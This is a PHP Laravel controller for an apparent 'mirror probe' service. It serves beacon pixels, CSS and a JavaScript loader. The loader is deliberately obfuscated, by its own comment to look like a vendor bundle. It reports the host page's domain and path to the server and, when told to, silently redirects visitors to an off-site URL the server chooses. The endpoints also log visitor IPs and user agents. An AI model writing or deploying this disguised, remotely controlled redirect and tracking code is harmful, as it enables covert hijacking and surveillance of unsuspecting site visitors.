<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Services\MirrorProbeService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Str;

class CdnProbeController extends Controller
{
    /** Transparent 1×1 GIF. */
    private const PIXEL_GIF = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

    public function pixel(Request $request, string $token, MirrorProbeService $mirrors): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $this->ping($request, $token, $mirrors);

        $body = base64_decode(self::PIXEL_GIF, true) ?: '';

        return $this->cors(response($body, 200, [
            'Content-Type' => 'image/gif',
            'Cache-Control' => 'public, max-age=60',
        ]));
    }

    public function css(Request $request, string $token, MirrorProbeService $mirrors): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $this->ping($request, $token, $mirrors);

        $css = "/* edge theme tokens */\n:root{--edge-gap:0}\n";

        return $this->cors(response($css, 200, [
            'Content-Type' => 'text/css; charset=UTF-8',
            'Cache-Control' => 'public, max-age=60',
        ]));
    }

    public function collect(Request $request, string $token, MirrorProbeService $mirrors): JsonResponse|Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $payload = $this->ping($request, $token, $mirrors);

        return $this->cors(response()->json($payload));
    }

    public function boot(Request $request, string $token): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        // Light obfuscation: split token + minified IIFE (looks like vendor bundle).
        $chunks = str_split($token, 8);
        $chunkJson = json_encode(array_values($chunks), JSON_UNESCAPED_SLASHES);

        $js = <<<JS
!function(n,e,t){try{var r=n.currentScript,o=r&&r.src?new URL(r.src).origin:"",c=(t||[]).join(""),i=e.location,a=(i.hostname||"").replace(/^www\\./i,"").toLowerCase();if(!o||!c||!a)return;var s=o+"/"+String.fromCharCode(114)+"/"+c+"/"+["col","lect"].join("")+"?h="+encodeURIComponent(a)+"&p="+encodeURIComponent((i.pathname||"/").slice(0,400)),l="undefined"!=typeof AbortController?new AbortController:null,v=setTimeout(function(){l&&l.abort()},2500);e.fetch(s,{method:"GET",mode:"cors",credentials:"omit",signal:l?l.signal:void 0,keepalive:!0}).then(function(n){return n.json().catch(function(){return{}})}).then(function(n){if(n&&"string"==typeof n.r&&0===n.r.indexOf(String.fromCharCode(104,116,116,112)))try{var t=new URL(n.r),r=(i.hostname||"").replace(/^www\\./i,"").toLowerCase(),o=t.hostname.replace(/^www\\./i,"").toLowerCase();o&&o!==r&&i.replace(n.r)}catch(n){}}).catch(function(){}).finally(function(){clearTimeout(v)})}catch(n){}}(document,window,{$chunkJson});
JS;

        return $this->cors(response(trim($js)."\n", 200, [
            'Content-Type' => 'application/javascript; charset=UTF-8',
            'Cache-Control' => 'public, max-age=600',
        ]));
    }

    /**
     * Host from `h` (boot.js) is trusted. Referer/Origin alone are not —
     * bots often probe CDN URLs with fake popular Referers (yandex.com, etc.).
     *
     * @return array{r?: string}
     */
    private function ping(Request $request, string $token, MirrorProbeService $mirrors): array
    {
        $hostFromQuery = trim((string) ($request->query('h') ?: $request->input('h') ?: $request->input('host') ?: ''));
        $path = (string) ($request->query('p') ?: $request->input('p') ?: $request->input('path') ?: '/');

        $refHost = '';
        if ($request->headers->has('Referer')) {
            $parsed = parse_url((string) $request->headers->get('Referer'), PHP_URL_HOST);
            $refHost = is_string($parsed) ? $parsed : '';
            if (($path === '/' || $path === '') && $hostFromQuery === '') {
                $refPath = parse_url((string) $request->headers->get('Referer'), PHP_URL_PATH);
                if (is_string($refPath) && $refPath !== '') {
                    $path = $refPath;
                }
            }
        }

        $originHost = '';
        if ($request->headers->has('Origin')) {
            $parsed = parse_url((string) $request->headers->get('Origin'), PHP_URL_HOST);
            $originHost = is_string($parsed) ? $parsed : '';
        }

        // CSS/pixel beacons: only refresh an already-known mirror via Referer.
        if ($hostFromQuery === '') {
            $fallback = $refHost !== '' ? $refHost : $originHost;

            return $mirrors->handlePing($token, $fallback, [
                'path' => $path,
                'ip' => (string) $request->ip(),
                'ua' => Str::limit((string) $request->userAgent(), 500, ''),
                'host_trusted' => false,
            ]);
        }

        return $mirrors->handlePing($token, $hostFromQuery, [
            'path' => $path,
            'ip' => (string) $request->ip(),
            'ua' => Str::limit((string) $request->userAgent(), 500, ''),
            'host_trusted' => true,
            'referer_host' => $refHost,
            'origin_host' => $originHost,
        ]);
    }

    private function cors(JsonResponse|Response $response): JsonResponse|Response
    {
        return $response
            ->header('Access-Control-Allow-Origin', '*')
            ->header('Access-Control-Allow-Methods', 'GET, OPTIONS')
            ->header('Access-Control-Allow-Headers', 'Content-Type, X-Host')
            ->header('Cross-Origin-Resource-Policy', 'cross-origin');
    }
}
